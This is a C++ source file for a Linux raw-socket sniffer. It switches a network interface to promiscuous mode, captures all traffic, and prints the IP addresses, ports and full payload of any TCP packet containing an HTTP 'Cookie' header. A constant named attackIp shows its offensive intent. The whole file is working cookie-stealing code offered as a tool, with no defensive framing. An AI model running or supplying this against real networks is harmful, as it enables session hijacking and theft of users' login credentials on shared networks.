/*************************************************************************
	> File Name: net.cpp
	> Created Time: 2015年04月12日 星期日 12时06分23秒
 ************************************************************************/

#include<stdio.h>
#include<stdlib.h>
#include<unistd.h>
#include<sys/socket.h>
#include<sys/ioctl.h>
#include<sys/types.h>
#include<linux/if_ether.h>
#include<netinet/in.h>
#include<netinet/ether.h>
#include<netinet/ip.h>
#include<netinet/tcp.h>
#include<string.h>
#include<errno.h>
#include<net/if.h>
#define  MAX_BUFFER 4096
const uint8_t attackIp[] = {192,168,0,195};
int checkTCP(const  iphdr* iph, int cnt);
int SetIfPromisc(int sock, char* frame)
{
	struct ifreq ifr;
	memset(&ifr, 0, sizeof(ifr));
	strncpy(ifr.ifr_name, frame, IF_NAMESIZE);
	if(ioctl(sock, SIOCGIFFLAGS, &ifr) < 0)
	{
		perror("ioctl");
		close(sock);
		exit(-1);
	}
	ifr.ifr_flags |= IFF_PROMISC;
	if(ioctl(sock, SIOCSIFFLAGS, &ifr))
	{
		perror("ioctl");
		close(sock);
		exit(-1);
	}
	return 0;
}
void showIP(uint8_t *s, uint8_t *d)
{
	if(s == NULL || d == NULL)
	{
		perror("S OR D IS NULL");
		exit(-1);
	}
	printf("%d.%d.%d.%d -> %d.%d.%d.%d\n", s[0], s[1], s[2], s[3], d[0], d[1], d[2], d[3]);
}
int main()
{
	char* buffer[MAX_BUFFER];
	char frame[] = "eth1";
	struct ether_header *etherh;
	struct iphdr *iph;
	int sock, n_read;
	if((sock = socket(PF_PACKET,  SOCK_RAW, htons(ETH_P_ALL))) < 0)
	{
		perror("sock");	
		exit(-1);
	}
	SetIfPromisc(sock, frame);
	int i=0;
	while(1)
	{
		n_read = recvfrom(sock, buffer, MAX_BUFFER, 0, NULL, NULL);
		if(n_read < 42)
		{
			continue;
		}
		etherh = (struct ether_header *)buffer;
		iph = (struct iphdr *)(etherh + 1);
		if(iph->protocol == IPPROTO_TCP)
		{
			checkTCP(iph, n_read);
		}
	}
	return 1;
}
int checkTCP(const struct iphdr *iph, int cnt)
{
	if(iph == NULL)
	{
		perror("iph");
		exit(-1);
	}
	char* http;
	struct tcphdr *tcph = (struct tcphdr *)(iph + 1);
	http = (char*)(tcph + 1);
	char *p = strstr(http, "Cookie");
	if(p != NULL)
	{
		printf("--------begin--------\n");
		showIP((uint8_t*)&(iph->saddr), (uint8_t*)&(iph->daddr));
		printf("src port: %d, dest port: %d \n", tcph->source, tcph->dest);
		for(int i=0;i<cnt -42;i++)
		{
			printf("%c", http[i]);
		}
		printf("\n--------end--------\n");
	}
	return 1;
}
